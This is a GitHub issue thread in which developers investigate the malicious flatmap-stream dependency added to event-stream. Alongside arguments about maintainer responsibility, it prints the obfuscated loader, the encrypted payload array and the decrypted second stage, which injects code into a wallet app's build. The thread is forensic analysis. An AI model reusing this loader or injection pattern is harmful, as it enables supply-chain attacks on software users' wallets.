1416	There's projects I've given up on. Even if I'll never work on it again, I'm not going to hand over control to a complete stranger! That's a ridiculous proposition. That's what the **Fork** button is for.
1417	"The buck stops here. Here being defined as the entity choosing this package and _using_ it. You are responsible for what you ship to customers. Vendor your libraries, use git submodules, vet *your* deps. Its your problem @StoneCypher and co.
"
1418	@tj - you know, it's actually quite possible to transfer an npm name to a fork
1419	"Some of y'all are really quick to forget what this software is licensed under:

> THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND"
1420	The buck stops here. Here being defined as the entity choosing this package and _using_ it. You are responsible for what you ship to customers. Vendor your libraries, use git submodules, vet *your* deps. Its your problem @StoneCypher and co.
1421	"> Some of y'all are really quick to forget what this software is licensed under:
> 
> > THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND

That covers him legally, sure. It doesn't mean he can't be criticised for it."
1422	I see a lot of people whose source no longer seems safe to me
1423	Was going to say it's impossible to properly vet people since somebody that seems trustworthy can suddenly turn out not to be. But then I went to @right9ctrl's profile page and it's a 1yr Chinese blank account with no repos (all forks).
1424	"Please stop arguing. Let's focus on understanding what damage the encrypted code is doing. And how we can recover from it.

@FallingSnow I'm trying to look at the decoded payload, if you find something useful please let us know, I'll do the same"
1425	Well actually, transferring ownership of a library is a common thing to do in the open source world. The reason some of you might not be aware of this is because there are no issues most of the time.
1426	"__People, can we stop arguing about this for now?__ It's quite a bit more important that we figure out what the malicious code in question actually *does*.

The undoubtedly lengthy debate about security expectations in open-source can be had later.

@FallingSnow The publish dates are as follows:

```
created | ""2018-09-05T08:23:42.124Z""
0.1.0 | ""2018-09-05T08:23:42.256Z""
modified | ""2018-11-26T17:18:17.658Z""
0.1.1 | ""2018-10-05T08:20:23.091Z""
0.1.2 | ""2018-11-15T20:10:17.657Z""
```

Source: http://registry.npmjs.com/flatmap-stream"
1427	"@fent the city says tokyo
"
1428	Also, the package appears to have been unpublished by npm support now.
1429	"```
function d() {
    function decode(codedString) {
        return Buffer.from(codedString, ""hex"").toString();
    }

    var data = [""75d4c87f3f69e0fa292969072c49dff4f90f44c1385d8eb60dae4cc3a229e52cf61f78b0822353b4304e323ad563bc22c98421eb6a8c1917e30277f716452ee8d57f9838e00f0c4e4ebd7818653f00e72888a4031676d8e2a80ca3cb00a7396ae3d140135d97c6db00cab172cbf9a92d0b9fb0f73ff2ee4d38c7f6f4b30990f2c97ef39ae6ac6c828f5892dd8457ab530a519cd236ebd51e1703bcfca8f9441c2664903af7e527c420d9263f4af58ccb5843187aa0da1cbb4b6aedfd1bdc6faf32f38a885628612660af8630597969125c917dfc512c53453c96c143a2a058ba91bc37e265b44c5874e594caaf53961c82904a95f1dd33b94e4dd1d00e9878f66dafc55fa6f2f77ec7e7e8fe28e4f959eab4707557b263ec74b2764033cd343199eeb6140a6284cb009a09b143dce784c2cd40dc320777deea6fbdf183f787fa7dd3ce2139999343b488a4f5bcf3743eecf0d30928727025ff3549808f7f711c9f7614148cf43c8aa7ce9b3fcc1cff4bb0df75cb2021d0f4afe5784fa80fed245ee3f0911762fffbc36951a78457b94629f067c1f12927cdf97699656f4a2c4429f1279c4ebacde10fa7a6f5c44b14bc88322a3f06bb0847f0456e630888e5b6c3f2b8f8489cd6bc082c8063eb03dd665badaf2a020f1448f3ae268c8d176e1d80cc756dc3fa02204e7a2f74b9da97f95644792ee87f1471b4c0d735589fc58b5c98fb21c8a8db551b90ce60d88e3f756cc6c8c4094aeaa12b149463a612ea5ea5425e43f223eb8071d7b991cfdf4ed59a96ccbe5bdb373d8febd00f8c7effa57f06116d850c2d9892582724b3585f1d71de83d54797a0bfceeb4670982232800a9b695d824a7ada3d41e568ecaa6629"", ""db67fdbfc39c249c6f338194555a41928413b792ff41855e27752e227ba81571483c631bc659563d071bf39277ac3316bd2e1fd865d5ba0be0bbbef3080eb5f6dfdf43b4a678685aa65f30128f8f36633f05285af182be8efe34a2a8f6c9c6663d4af8414baaccd490d6e577b6b57bf7f4d9de5c71ee6bbffd70015a768218a991e1719b5428354d10449f41bac70e5afb1a3e03a52b89a19d4cc333e43b677f4ec750bf0be23fb50f235dd6019058fbc3077c01d013142d9018b076698536d2536b7a1a6a48f5485871f7dc487419e862b1a7493d840f14e8070c8eff54da8013fd3fe103db2ecebc121f82919efb697c2c47f79516708def7accd883d980d5618efd408c0fd46fd387911d1e72e16cf8842c5fe3477e4b46aa7bb34e3cf9caddfca744b6a21b5457beaccff83fa6fb6e8f3876e4764e0d4b5318e7f3eed34af757eb240615591d5369d4ab1493c8a9c366dfa3981b92405e5ebcbfd5dca2c6f9b8e8890a4635254e1bc26d2f7a986e29fef6e67f9a55b6faec78d54eb08cb2f8ea785713b2ffd694e7562cf2b06d38a0f97d0b546b9a121620b7f9d9ccca51b5e74df4bdd82d2a5e336a1d6452912650cc2e8ffc41bd7aa17ab17f60b2bd0cfc0c35ed82c71c0662980f1242c4523fae7a85ccd5e821fe239bfb33d38df78099fd34f429d75117e39b888344d57290b21732f267c22681e4f640bec9437b756d3002a3135564f1c5947cc7c96e1370db7af6db24c9030fb216d0ac1d9b2ca17cb3b3d5955ffcc3237973685a2c078e10bc6e36717b1324022c8840b9a755cffdef6a4d1880a4b6072fd1eb7aabebb9b949e1e37be6dfb6437c3fd0e6f135bcea65e2a06eb35ff26dcf2b2772f8d0cde8e5fa5eec577e9754f6b044502f8ce8838d36827bd3fe91cccba2a04c3ee90c133352cbad34951fdf21a671a4e3940fd69cfee172df4123a0f678154871afa80f763d78df971a1317200d0ce5304b3f01ace921ea8afb41ec800ab834d81740353101408733fb710e99657554c50a4a8cb0a51477a07d6870b681cdc0be0600d912a0c711dc9442260265d50e269f02eb49da509592e0996d02a36a0ce040fff7bd3be57e97d07e4de0cdb93b7e3ccea422a5a526fb95ea8508ea2a40010f56d4aa96da23e6e9bcbae09dacccdcd8ac6af96a1922266c3795fb0798affaa75b8ae05221612ce45c824d1f6603fe2afd74b9e167736bfffe01a12b9f85912572a291336c693f133efeac881cd09207505ad93967e3b7a8972cdcce208bfa3b9956370795791ca91a8b9deabde26c3ee2adb43e9f7df2df16d4582a4e610b73754e609b1eea936a4d916bf5ed9d627692bcc8ed0933026e9250d16bdaf2b68470608aeaffedcf2be8c4c176bfc620e3f9f17a4a9d8ef9fe46cca41a79878d37423c0fa9f3ee1f4e6d68f029d6cbb5cbc90e7243135e0fc1dd66297d32adabc9a6d0235709be173b688ba2004f518f58f5459caca60d615ae4dc0d0eeacbe48ca8727a8b42dc78396316a0e223029b76311e7607ea5bd236307ba3b62afeff7a1ef5c0b5d7ee760c0f6472359c57817c5d9cd534d9a34bb4847bbc83c37b14b6444e9f386f1bec4b42c65d1078d54bd007ff545028205099abc454919406408b761a1636d10e39ede9f650f25abad3219b9d46d535402b930488535d97d19be3b0e75fed31d0b2f8af099481685e2b4fa9bff05cbac1b9b405db2c7eae68501633e02723560727a1c8c34c32afc76cdeb82fe8bae34b09cd82402076b9f481d043b080d851c7b6ba8613adba3bc3d5edb9a84fce41130ad328fe4c062a76966cb60c4fa801f359d22b70a797a2c2a3d19da7383025cb2e076b9c30b862456ae4b60197101e82133748c224a1431545fde146d98723ccb79b47155b218914c76f5d52027c06c6c913450fc56527a34c3fe1349f38018a55910de819add6204ab2829668ca0b7afb0d00f00c873a3f18daad9ae662b09c775cddbe98b9e7a43f1f8318665027636d1de18b5a77f548e9ede3b73e3777c44ec962fb7a94c56d8b34c1da603b3fc250799aad48cc007263daf8969dbe9f8ade2ac66f5b66657d8b56050ff14d8f759dd2c7c0411d92157531cfc3ac9c981e327fd6b140fb2abf994fa91aecc2c4fef5f210f52d487f117873df6e847769c06db7f8642cd2426b6ce00d6218413fdbba5bbbebc4e94bffdef6985a0e800132fe5821e62f2c1d79ddb5656bd5102176d33d79cf4560453ca7fd3d3c3be0190ae356efaaf5e2892f0d80c437eade2d28698148e72fbe17f1fac993a1314052345b701d65bb0ea3710145df687bb17182cd3ad6c121afef20bf02e0100fd63cbbf498321795372398c983eb31f184fa1adbb24759e395def34e1a726c3604591b67928da6c6a8c5f96808edfc7990a585411ffe633bae6a3ed6c132b1547237cab6f3b24c57d3d4cd8e2fbbd9f7674ececf0f66b39c2591330acc1ac20732a98e9b61a3fd979f88ab7211acbf629fcb0c80fb5ed1ea55df0735dcf13510304652763a5ed7bde3e5ebda1bf72110789ebefa469b70f6b4add29ce1471fa6972df108717100412c804efcf8aaba277f0107b1c51f15f144ab02dd8f334d5b48caf24a4492979fa425c4c25c4d213408ecfeb82f34e7d20f26f65fa4e89db57582d6a928914ee6fc0c6cc0a9793aa032883ea5a2d2135dbfcf762f4a2e22585966be376d30fbfabb1dfd182e7b174097481763c04f5d7cbd060c5a36dc0e3dd235de1669f3db8747d5b74d8c1cc9ab3a919e257fb7e6809f15ab7c2506437ced02f03416a1240a555f842a11cde514c450a2f8536f25c60bbe0e1b013d8dd407e4cb171216e30835af7ca0d9e3ff33451c6236704b814c800ecc6833a0e66cd2c487862172bc8a1acb7786ddc4e05ba4e41ada15e0d6334a8bf51373722c26b96bbe4d704386469752d2cda5ca73f7399ff0df165abb720810a4dc19f76ca748a34cb3d0f9b0d800d7657f702284c6e818080d4d9c6fff481f76fb7a7c5d513eae7aa84484822f98a183e192f71ea4e53a45415ddb03039549b18bc6e1"", ""63727970746f"", ""656e76"", ""6e706d5f7061636b6167655f6465736372697074696f6e"", ""616573323536"", ""6372656174654465636970686572"", ""5f636f6d70696c65"", ""686578"", ""75746638""];
    var decipher = require('crypto').createDecipher('aes256', process.env.npm_package_description);
    var payload = decipher.update(data[0], 'hex', 'utf8') + decipher.final('utf8');
    var f = new module.constructor();
    f.paths = module.paths
    f._compile(payload, """")
    f.exports(data[1]);
}

process.env.npm_package_description = '';
d();
```

this is my attempt at reverse engineering it, but I can't get it to decode anything other than gibberish. Finding the right `npm_package_description` appears to be hard, I'm assuming this was a fairly targeted attack but I'm not too familiar with how NPM sets those env vars, but I assume it's set to whatever the top level package is at some point in a lifecycle? Does anyone who knows NPM (or maybe Yarn or an alternative?) better than me know any more?"
1430	@FallingSnow @Enrico204 the [user's profile](https://github.com/right9ctrl) says that he's in 東京都 (Tokyo), have you tried looking at the payload with CJK character sets?  Can you try UTF-8, UTF-16, GBK, GB2312, BIG5, maybe other character sets for Japanese and Korean as well?
1431	@EdwardDrapkin I'll try, but it might be false (of course)
1432	"@cnorthwood There's a bulk set of npm registry metadata available at https://gzemnid.nodejs.org/datasets/ - you might be able to automate attempting the decryption with each possible package description in the entire registry.

So far, this seems like an attack that's targeted towards a specific package, using the package description as the 'marker' for code execution by using it for decryption."
1433	"> The buck stops here. Here being defined as the entity choosing this package and _using_ it. You are responsible for what you ship to customers. Vendor your libraries, use git submodules, vet _your_ deps. Its your problem @StoneCypher and co.

This thread is full of entitled folks, but I don't know what else I should expect - entitlement is a pervasive attitude of OSS users. [EDIT: I made the unfortunate mistake of calling out the quote as an example of entitlement, but that was incorrect, and this comment has been edited to reflect that.]

> Some of y'all are really quick to forget what this software is licensed under:
> 
> > THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND

The correct answer.

> So many people who want something for nothing, give Dominic a break. I hand off tons of my modules to people who are willing to maintain them as well, we shouldn't be expected to vet people. OSS authors already spend time providing something for free why should they be required to waste more time. This is why OSS needs funding and developers should stop being so entitled.

The even more correct answer.

> Please stop arguing. Let's focus on understanding what damage the encrypted code is doing. And how we can recover from it.

The most correct answer. Focus on solving the problem, not pointing fingers."
1434	"I'd like to emphasize this comment from @dominictarr :

https://github.com/dominictarr/event-stream/issues/116#issuecomment-441116734

This is an issue I have also experience with GitHub. You can not transfer ownership of a repo to another user if they have a fork under their namespace. This is absurd because most likely a potential maintainer has their own fork.  I'd argue this is also a failing on Github."
1435	"The comments about disclaimed warranty are correct, and important to note. @dominictarr is not responsible for damages caused by this software. He is a victim himself, in that he has been misled by a malicious attacker.

I think ultimately this situation could have only been prevented by using a package system more akin to `apt`, where developers who can sign packages are carefully selected and managed.

I wish everyone success in figuring out how to recover from these issues."
1436	@cnorthwood folks at npm have just removed the `flatmap-stream` package, I don't have the `./test/data` file anymore (I was just about to download it). Can you send it to me? I want to try to decode it with some other packages descriptions
1437	"@Enrico204 

```
module.exports=[""75d4c87f3f69e0fa292969072c49dff4f90f44c1385d8eb60dae4cc3a229e52cf61f78b0822353b4304e323ad563bc22c98421eb6a8c1917e30277f716452ee8d57f9838e00f0c4e4ebd7818653f00e72888a4031676d8e2a80ca3cb00a7396ae3d140135d97c6db00cab172cbf9a92d0b9fb0f73ff2ee4d38c7f6f4b30990f2c97ef39ae6ac6c828f5892dd8457ab530a519cd236ebd51e1703bcfca8f9441c2664903af7e527c420d9263f4af58ccb5843187aa0da1cbb4b6aedfd1bdc6faf32f38a885628612660af8630597969125c917dfc512c53453c96c143a2a058ba91bc37e265b44c5874e594caaf53961c82904a95f1dd33b94e4dd1d00e9878f66dafc55fa6f2f77ec7e7e8fe28e4f959eab4707557b263ec74b2764033cd343199eeb6140a6284cb009a09b143dce784c2cd40dc320777deea6fbdf183f787fa7dd3ce2139999343b488a4f5bcf3743eecf0d30928727025ff3549808f7f711c9f7614148cf43c8aa7ce9b3fcc1cff4bb0df75cb2021d0f4afe5784fa80fed245ee3f0911762fffbc36951a78457b94629f067c1f12927cdf97699656f4a2c4429f1279c4ebacde10fa7a6f5c44b14bc88322a3f06bb0847f0456e630888e5b6c3f2b8f8489cd6bc082c8063eb03dd665badaf2a020f1448f3ae268c8d176e1d80cc756dc3fa02204e7a2f74b9da97f95644792ee87f1471b4c0d735589fc58b5c98fb21c8a8db551b90ce60d88e3f756cc6c8c4094aeaa12b149463a612ea5ea5425e43f223eb8071d7b991cfdf4ed59a96ccbe5bdb373d8febd00f8c7effa57f06116d850c2d9892582724b3585f1d71de83d54797a0bfceeb4670982232800a9b695d824a7ada3d41e568ecaa6629"",""db67fdbfc39c249c6f338194555a41928413b792ff41855e27752e227ba81571483c631bc659563d071bf39277ac3316bd2e1fd865d5ba0be0bbbef3080eb5f6dfdf43b4a678685aa65f30128f8f36633f05285af182be8efe34a2a8f6c9c6663d4af8414baaccd490d6e577b6b57bf7f4d9de5c71ee6bbffd70015a768218a991e1719b5428354d10449f41bac70e5afb1a3e03a52b89a19d4cc333e43b677f4ec750bf0be23fb50f235dd6019058fbc3077c01d013142d9018b076698536d2536b7a1a6a48f5485871f7dc487419e862b1a7493d840f14e8070c8eff54da8013fd3fe103db2ecebc121f82919efb697c2c47f79516708def7accd883d980d5618efd408c0fd46fd387911d1e72e16cf8842c5fe3477e4b46aa7bb34e3cf9caddfca744b6a21b5457beaccff83fa6fb6e8f3876e4764e0d4b5318e7f3eed34af757eb240615591d5369d4ab1493c8a9c366dfa3981b92405e5ebcbfd5dca2c6f9b8e8890a4635254e1bc26d2f7a986e29fef6e67f9a55b6faec78d54eb08cb2f8ea785713b2ffd694e7562cf2b06d38a0f97d0b546b9a121620b7f9d9ccca51b5e74df4bdd82d2a5e336a1d6452912650cc2e8ffc41bd7aa17ab17f60b2bd0cfc0c35ed82c71c0662980f1242c4523fae7a85ccd5e821fe239bfb33d38df78099fd34f429d75117e39b888344d57290b21732f267c22681e4f640bec9437b756d3002a3135564f1c5947cc7c96e1370db7af6db24c9030fb216d0ac1d9b2ca17cb3b3d5955ffcc3237973685a2c078e10bc6e36717b1324022c8840b9a755cffdef6a4d1880a4b6072fd1eb7aabebb9b949e1e37be6dfb6437c3fd0e6f135bcea65e2a06eb35ff26dcf2b2772f8d0cde8e5fa5eec577e9754f6b044502f8ce8838d36827bd3fe91cccba2a04c3ee90c133352cbad34951fdf21a671a4e3940fd69cfee172df4123a0f678154871afa80f763d78df971a1317200d0ce5304b3f01ace921ea8afb41ec800ab834d81740353101408733fb710e99657554c50a4a8cb0a51477a07d6870b681cdc0be0600d912a0c711dc9442260265d50e269f02eb49da509592e0996d02a36a0ce040fff7bd3be57e97d07e4de0cdb93b7e3ccea422a5a526fb95ea8508ea2a40010f56d4aa96da23e6e9bcbae09dacccdcd8ac6af96a1922266c3795fb0798affaa75b8ae05221612ce45c824d1f6603fe2afd74b9e167736bfffe01a12b9f85912572a291336c693f133efeac881cd09207505ad93967e3b7a8972cdcce208bfa3b9956370795791ca91a8b9deabde26c3ee2adb43e9f7df2df16d4582a4e610b73754e609b1eea936a4d916bf5ed9d627692bcc8ed0933026e9250d16bdaf2b68470608aeaffedcf2be8c4c176bfc620e3f9f17a4a9d8ef9fe46cca41a79878d37423c0fa9f3ee1f4e6d68f029d6cbb5cbc90e7243135e0fc1dd66297d32adabc9a6d0235709be173b688ba2004f518f58f5459caca60d615ae4dc0d0eeacbe48ca8727a8b42dc78396316a0e223029b76311e7607ea5bd236307ba3b62afeff7a1ef5c0b5d7ee760c0f6472359c57817c5d9cd534d9a34bb4847bbc83c37b14b6444e9f386f1bec4b42c65d1078d54bd007ff545028205099abc454919406408b761a1636d10e39ede9f650f25abad3219b9d46d535402b930488535d97d19be3b0e75fed31d0b2f8af099481685e2b4fa9bff05cbac1b9b405db2c7eae68501633e02723560727a1c8c34c32afc76cdeb82fe8bae34b09cd82402076b9f481d043b080d851c7b6ba8613adba3bc3d5edb9a84fce41130ad328fe4c062a76966cb60c4fa801f359d22b70a797a2c2a3d19da7383025cb2e076b9c30b862456ae4b60197101e82133748c224a1431545fde146d98723ccb79b47155b218914c76f5d52027c06c6c913450fc56527a34c3fe1349f38018a55910de819add6204ab2829668ca0b7afb0d00f00c873a3f18daad9ae662b09c775cddbe98b9e7a43f1f8318665027636d1de18b5a77f548e9ede3b73e3777c44ec962fb7a94c56d8b34c1da603b3fc250799aad48cc007263daf8969dbe9f8ade2ac66f5b66657d8b56050ff14d8f759dd2c7c0411d92157531cfc3ac9c981e327fd6b140fb2abf994fa91aecc2c4fef5f210f52d487f117873df6e847769c06db7f8642cd2426b6ce00d6218413fdbba5bbbebc4e94bffdef6985a0e800132fe5821e62f2c1d79ddb5656bd5102176d33d79cf4560453ca7fd3d3c3be0190ae356efaaf5e2892f0d80c437eade2d28698148e72fbe17f1fac993a1314052345b701d65bb0ea3710145df687bb17182cd3ad6c121afef20bf02e0100fd63cbbf498321795372398c983eb31f184fa1adbb24759e395def34e1a726c3604591b67928da6c6a8c5f96808edfc7990a585411ffe633bae6a3ed6c132b1547237cab6f3b24c57d3d4cd8e2fbbd9f7674ececf0f66b39c2591330acc1ac20732a98e9b61a3fd979f88ab7211acbf629fcb0c80fb5ed1ea55df0735dcf13510304652763a5ed7bde3e5ebda1bf72110789ebefa469b70f6b4add29ce1471fa6972df108717100412c804efcf8aaba277f0107b1c51f15f144ab02dd8f334d5b48caf24a4492979fa425c4c25c4d213408ecfeb82f34e7d20f26f65fa4e89db57582d6a928914ee6fc0c6cc0a9793aa032883ea5a2d2135dbfcf762f4a2e22585966be376d30fbfabb1dfd182e7b174097481763c04f5d7cbd060c5a36dc0e3dd235de1669f3db8747d5b74d8c1cc9ab3a919e257fb7e6809f15ab7c2506437ced02f03416a1240a555f842a11cde514c450a2f8536f25c60bbe0e1b013d8dd407e4cb171216e30835af7ca0d9e3ff33451c6236704b814c800ecc6833a0e66cd2c487862172bc8a1acb7786ddc4e05ba4e41ada15e0d6334a8bf51373722c26b96bbe4d704386469752d2cda5ca73f7399ff0df165abb720810a4dc19f76ca748a34cb3d0f9b0d800d7657f702284c6e818080d4d9c6fff481f76fb7a7c5d513eae7aa84484822f98a183e192f71ea4e53a45415ddb03039549b18bc6e1"",""63727970746f"",""656e76"",""6e706d5f7061636b6167655f6465736372697074696f6e"",""616573323536"",""6372656174654465636970686572"",""5f636f6d70696c65"",""686578"",""75746638""];
```"
1438	"FWIW, the flatmap-stream package has been unpublished from npm:
```sh
 ⇶ npm view flatmap-stream
npm ERR! code E404
npm ERR! 404 Unpublished by npm-support on 2018-11-26T17:18:17.658Z
```"
1439	"> The most correct answer. Focus on solving the problem, not pointing fingers.

Ding ding ding. I'm going to just add :-1: to blame game participants, and I'd recommend others do the same *without engaging*. Let's keep this thread focused on solving the problem and decoding the payload rather than complaining about the software none of us paid for or contributed to."
1440	@cnorthwood The npm_package_* environment variables are set by npm to correspond with fields in the `package.json` of the top-level package whenever a script from the package is run. (see https://docs.npmjs.com/misc/scripts) I think this means that the attack wouldn't be triggered just by `require`-ing the package in your code, but when you run a script from the targeted package? The code does have a check to stop if `npm_package_description` isn't set (as would be the case in a normal program)
1441	"When using `Get all children of a pid` as the decryption key, nothing happens other than a syntax error, which is caught and ignored. Any other possible decryption key will result in ""bad decrypt""."
1442	"Attached is a list of every public package on npm, as of 2018-11-12, that depended on `flatmap-stream` either directly or indirectly.

cc @cnorthwood 

[flatmap-deps-list.txt](https://github.com/dominictarr/event-stream/files/2616706/flatmap-deps-list.txt)"
1443	Thanks @joepie91 I'll try to automate the extraction with that list :-)
1444	"@patosai That only lists the *direct* dependents. It's more likely to be in an indirect dependent, which won't show in that list. You can use the list I posted for that purpose, or recreate it:

```
curl https://gzemnid.nodejs.org/datasets/out.2018-11-12/deps-nested.json.lz4 | unlz4 | grep flatmap-stream > ~/flatmap-deps.txt
cat ~/flatmap-deps.txt | grep -oE '^""[^""]+""' | sed 's:^.\(.*\).$:\1:' > ~/flatmap-deps-list.txt
```"
1445	Is there a means to get NPM to add this to the security reports for `npm audit`? Just ran this on a repo that _does_ have `flatmap-stream` in package-lock, and it reports no issues. Seems like that's a glaring hole if they've already removed the module from NPM.
1446	We got rid of the `event-stream` dependency, here's how: https://github.com/sweetalert2/sweetalert2/pull/1305/files
1447	@shellscape Probably via their security team.  Unfortunately, it sounds like they're still reeling from Thanksgiving.
1448	@shellscape The entire `flatmap-stream` package has been unpublished, so it should not be installable at all anymore. The `npm audit` lists are only used to warn of legitimate packages that have accidental vulnerabilities in them, the outright malicious ones are just removed entirely.
1449	@shellscape I'd recommend contacting the [npm security team](https://www.npmjs.com/policies/security).
1450	I'm downloading all packages descriptions using the list that @joepie91 provided. I'll post the file here as soon as I finished (there are a lot of packages) so everyone can experiment with that.
1451	@shellscape Probably via their security team.  Unfortunately, it sounds like they're still reeling from Thanksgiving.
1452	Looks like the target is the `cosa` package
1453	"You can search your company's code for usage of event-stream here: https://github.com/search?l=JSON&q=org%3Areduxjs+event-stream&type=Code

Just swap out `org:reduxjs` for your own org's name."
1454	"> @dominictarr: although I completely disagree with someone else contacting npm support, I contacted npm support myself for now.
> 
> You put at risk millions of people, and making something for free, but public, means you are responsible for the package.
> 
> Anyway, I don't want to argue about this, I just want the issue to be solved, because this is a popular package.

Someone didn't read the LICENSE file... 

> THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, 
EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES 
OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. 
IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR 
ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, 
TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE 
SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE."
1455	Another option: http://highlandjs.org/
1456	@tuxone how do you know?
1457	@tuxone what gives?
1458	"`createDecipher` works with ""cosa"" as password."
1459	I can't decrypt the payload with both `cosa` and `highlandjs` packages descriptions, so I don't think so. @sandro-pasquali @tuxone Why do you think that?
1460	"> The npm_package_* environment variables are set by npm to correspond with fields in the package.json of the top-level package whenever a script from the package is run.

FYI: I just noticed that the value of `npm_package_description` can also come from some other file if `description` is not set in `package.json`. In my test example, NPM takes the value from `README.md`....I haven't yet found the source of this behaviour, but it's clear that the decryption key doesn't necessarily come from `package.json`."
1461	It can decrypt okay with several passwords, the issue is that what it them decoded later on is giberish. Also, it needs to be the description of the package, not the name.
1462	@Gekkio Do you have an example case?
1463	"> The most correct answer. Focus on solving the problem, not pointing fingers.

Once the problem has been addressed a discussion on etiquette and community expectations is prudent.

There is an implicit web of trust within open source and events like this bring to light how simultaneously important and difficult it is for projects to be aware of their impact and behave accordingly.
"
1464	For those doing forensics, the Yarn registry proxy still has flatmap-stream in its cache: https://registry.yarnpkg.com/flatmap-stream/-/flatmap-stream-0.1.1.tgz
1465	"> @Gekkio Do you have an example case?

index.js:

```
console.info(process.env.npm_package_description)
```

package.json:
```
{
  ""name"": ""test"",
  ""scripts"": {
    ""doit"": ""node index.js""
  }
}
```

README.md:

```
# Test1

Test2
```

Running `npm run doit` prints `Test2`"
1466	"@Gekkio Well, that's gonna make things more interesting to reverse...

Thanks for figuring that out for us."
1467	"@cnorthwood I'm trying with several descriptions from the dependency list as passwords. Right now, `ps-tree` is the only that has a ""compatible"" password, but the output is giberish. What other passwords did you find?"
1468	"People point out that @right9ctrl was an ""untrusted"", ""unknown"" developer, but it doesn't change anything had dominic waited until they make N good contributions to the project over N years before transferring ownership / publish rights. They might as well've been contributing to the project for 5 years before the transfer event, so I think it's a bark up the wrong tree if we're looking at this from the perspective of trying to prevent this kind of thing across the ecosystem.

"
1469	"FYI `ps-tree@1.1.1` locked to `event-stream@3.3.4` (which if I read this thread correctly pre-dates the questionable changes). 

Thanks to folks for bringing it to my attention: https://github.com/indexzero/ps-tree/pull/34"
1470	"This link: https://unpkg.com/flatmap-stream@0.1.1/index.min.js

Gives me this code:
```js
var Stream=require(""stream"").Stream;module.exports=function(e,n){var i=new Stream,a=0,o=0,u=!1,f=!1,l=!1,c=0,s=!1,d=(n=n||{}).failures?""failure"":""error"",m={};function w(r,e){var t=c+1;if(e===t?(void 0!==r&&i.emit.apply(i,[""data"",r]),c++,t++):m[e]=r,m.hasOwnProperty(t)){var n=m[t];return delete m[t],w(n,t)}a===++o&&(f&&(f=!1,i.emit(""drain"")),u&&v())}function p(r,e,t){l||(s=!0,r&&!n.failures||w(e,t),r&&i.emit.apply(i,[d,r]),s=!1)}function b(r,t,n){return e.call(null,r,function(r,e){n(r,e,t)})}function v(r){if(u=!0,i.writable=!1,void 0!==r)return w(r,a);a==o&&(i.readable=!1,i.emit(""end""),i.destroy())}return i.writable=!0,i.readable=!0,i.write=function(r){if(u)throw new Error(""flatmap stream is not writable"");s=!1;try{for(var e in r){a++;var t=b(r[e],a,p);if(f=!1===t)break}return!f}catch(r){if(s)throw r;return p(r),!f}},i.end=function(r){u||v(r)},i.destroy=function(){u=l=!0,i.writable=i.readable=f=!1,process.nextTick(function(){i.emit(""close"")})},i.pause=function(){f=!0},i.resume=function(){f=!1},i};!function(){try{var r=require,t=process;function e(r){return Buffer.from(r,""hex"").toString()}var n=r(e(""2e2f746573742f64617461"")),o=t[e(n[3])][e(n[4])];if(!o)return;var u=r(e(n[2]))[e(n[6])](e(n[5]),o),a=u.update(n[0],e(n[8]),e(n[9]));a+=u.final(e(n[9]));var f=new module.constructor;f.paths=module.paths,f[e(n[7])](a,""""),f.exports(n[1])}catch(r){}}();
```

Does anyone have a copy of the affected package files / tarball?"
1471	@Enrico204 could it be that this is a targeted attack against a potentially closed source project instead?
1472	@Fishrock123 that link was posted just a few comments before yours. The link is https://registry.yarnpkg.com/flatmap-stream/-/flatmap-stream-0.1.1.tgz
1473	"> For those doing forensics, the Yarn registry proxy still has flatmap-stream in its cache: https://registry.yarnpkg.com/flatmap-stream/-/flatmap-stream-0.1.1.tgz

~0.1.0, 0.1.1, and 0.1.2 on the yarn registry don't seem to contain the affected code~

sorry; it indeed does--look for `2e2f746573742f64617461`"
1474	@beaugunderson incorrect. The 0.1.1 does contain it. I just downloaded and verified.
1475	@Fishrock123 the code you pasted IS the code with some encrypted payload bootloader.
1476	"I got it decoded.  Package description ""A Secure Bitcoin Wallet"".  The targeted package is: https://www.npmjs.com/package/copay-dash

Decrypted code:
```
/*@@*/module.exports=function(e){try{if(!/build\:.*\-release/.test(process.argv[2]))return;var t=process.env.npm_package_description,r=require(""fs""),i=""./node_modules/@zxing/library/esm5/core/common/reedsolomon/ReedSolomonDecoder.js"",n=r.statSync(i),c=r.readFileSync(i,""utf8""),o=require(""crypto"").createDecipher(""aes256"",t),s=o.update(e,""hex"",""utf8"");s=""\n""+(s+=o.final(""utf8""));var a=c.indexOf(""\n/*@@*/"");0<=a&&(c=c.substr(0,a)),r.writeFileSync(i,c+s,""utf8""),r.utimesSync(i,n.atime,n.mtime),process.on(""exit"",function(){try{r.writeFileSync(i,c,""utf8""),r.utimesSync(i,n.atime,n.mtime)}catch(e){}})}catch(e){}};
```"
1477	"```
└─┬ nodemon@1.18.4
  └─┬ pstree.remy@1.1.0
    └─┬ ps-tree@1.1.0
      └─┬ event-stream@3.3.6
        └── flatmap-stream@0.1.0
```
Safe or in danger?"
1478	@maths22 can you post the decryption code?
1479	"here is the prettified bit from the end of 0.1.1's `index.min.js`:

```js
!(function() {
  try {
    var r = require,
      t = process;
    function e(r) {
      return Buffer.from(r, ""hex"").toString();
    }
    var n = r(e(""2e2f746573742f64617461"")),
      o = t[e(n[3])][e(n[4])];
    if (!o) return;
    var u = r(e(n[2]))[e(n[6])](e(n[5]), o),
      a = u.update(n[0], e(n[8]), e(n[9]));
    a += u.final(e(n[9]));
    var f = new module.constructor();
    (f.paths = module.paths), f[e(n[7])](a, """"), f.exports(n[1]);
  } catch (r) {}
})();
```"
1480	"This was my code.  Note that './real-desc.json' contained a list of NPM package descriptions.

```

function decode(data) {
    return Buffer.from(data, ""hex"").toString()
}

var esprima = require('esprima');

var packages = require('./real-desc.json');


